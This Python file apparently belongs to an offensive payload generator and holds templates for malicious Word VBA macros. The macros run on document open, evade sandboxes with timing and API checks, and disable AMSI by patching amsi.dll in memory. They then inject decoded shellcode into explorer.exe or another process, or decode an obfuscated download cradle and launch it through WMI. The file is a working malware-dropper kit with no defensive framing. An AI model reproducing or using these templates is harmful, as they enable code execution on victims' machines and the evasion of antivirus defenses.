template_vba_basic = """
Sub MyMacro()
    Dim str As String
    str = "powershell -nop -exec bypass -c ping.exe IPADDR"
    Shell str, vbHide
End Sub

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_default = """Type MODULEINFO
  lpBaseOfDLL As Long
  SizeOfImage As Long
  EntryPoint As Long
End Type
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Public Declare PtrSafe Function EnumProcesses Lib "psapi.dll" (lpidProcess As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr) As LongPtr
Public Declare PtrSafe Function IsWow64Process Lib "KERNEL32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function arch() As Boolean
    If Win64 Then
        arch = True
    Else
        arch = False
    End If
End Function

Function ismacheck(StrFile As String) As Boolean
    Dim szProcessName As String
    Dim mdi As MODULEINFO
    Dim hMod(0 To 1023) As LongPtr
    Dim res As LongPtr
    ismacheck = False
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    For i = 0 To UBound(hMod)
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = StrFile Then
            ismacheck = True
    End If
    Next i
End Function

Function patch(StrFile As String, Is64 As Boolean)
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    Dim old As LongPtr
    Dim off As Integer

    lib = getmod(StrFile)

    If Is64 Then
        off = 96
    Else
        off = 80
    End If
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)

    If Is64 Then
        off = 352
    Else
        off = 256
    End If
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Function

Function findWow64() As Long
    Dim hProcs(0 To 1023) As LongPtr
    Dim res As LongPtr
    Dim numProcs As Integer
    Dim isWow64 As Boolean
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr

    isWow64 = False
    findWow64 = 0

    res = EnumProcesses(hProcs(0), 1024, cbNeeded)
    If res <> 0 Then
        numProcs = cbNeeded / 4
        For i = 0 To numProcs
            If hProcs(i) <> 0 Then
                hProcess = OpenProcess(&H1F0FFF, False, hProcs(i))
                If hProcess <> 0 Then
                    res = IsWow64Process(hProcess, isWow64)
                    If isWow64 Then
                        findWow64 = hProcess
                        res = EnumProcessModulesEx(findWow64, hMod(0), 1024, cbNeeded, &H3)
                        szProcessName = String$(50, 0)
                        GetModuleBaseName findWow64, hMod(0), szProcessName, Len(szProcessName)
                        ' Exit immediately if we've found a 32-bit proc other than the Word process
                        If Left(szProcessName, 11) <> "WINWORD.exe" Then
                            Exit Function
                        End If
                    Else
                        res = CloseHandle(hProcess)
                    End If
                    isWow64 = False
                End If
            End If
        Next i
    End If
End Function

Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\\\.\\root\\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = \"\"\" & injProc & \"\"\"\", , 48)
    For Each Process In objProcessSet
        getPID = Process.ProcessID
    Next
End Function

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    Dim Is64 As Boolean
    Dim StrFile As String
    Dim check As Boolean
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    StrFile = Dir("c:\\windows\\system32\\a?s?.d*")
    Is64 = arch()

    check = ismacheck(StrFile)

    If check Then
        patch StrFile, Is64
    End If

    ' MSFVENOM
    SHELLCODE
    
    If Is64 Then
        pid = getPID("explorer.exe")
        Handle = OpenProcess(&H1F0FFF, False, pid)
    Else
        Handle = findWow64()
        If Handle = 0 Then
            pid = getPID("WINWORD.exe")
            Handle = OpenProcess(&H1F0FFF, False, pid)
        End If
    End If

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 17
    Next i

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("t")
    Next i

        For i = 0 To UBound(buf)
        buf(i) = buf(i) - 5
    Next i

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("y")
    Next i

    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_ps_default = """Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    Apples = "CRADLE"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

template_vba_ps_multi = """Private Declare PtrSafe Sub Sleep Lib "KERNEL32" (ByVal dwMilliseconds As Long)
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim tmp As LongPtr
    Dim Appletree As Variant
    
    t1 = Now()
    Sleep (4000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 3.5 Then
        Exit Function
    End If

    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    If ActiveDocument.Name <> FILENAME Then
        Exit Function
    End If

    Appletree = Array(CRADLE)
    For i = LBound(Appletree) To UBound(Appletree)
        Apples = Appletree(i)
        Water = Nuts(Apples)
        GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    Next i

End Function

Sub Run()
    MyMacro
End Sub

Sub Document_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub
"""

templates_dict = {
    "vba": {"basic": template_vba_basic, "default": template_vba_default},
    "vba-ps": {
        "default": template_vba_ps_default,
        "run": template_vba_ps_multi,
    },
}
